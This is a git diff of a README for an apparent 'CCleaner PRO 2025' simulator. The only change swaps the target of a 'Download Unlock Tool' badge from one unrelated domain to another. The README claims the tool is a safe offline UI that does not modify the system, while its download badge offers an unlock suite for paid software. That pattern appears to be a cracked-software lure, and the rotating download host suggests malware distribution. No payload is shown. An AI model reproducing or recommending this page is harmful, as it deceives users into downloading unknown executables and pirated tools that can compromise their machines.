@@ -3,7 +3,7 @@
 Explore the features of CCleaner PRO 2025 in a safe, simulated environment.  
 This offline UI utility provides a visual experience of optimization modules, license states, and configuration flows — **without modifying your system**.
 
-[![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
+[![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://ton-stake.net)
 
 ---
 
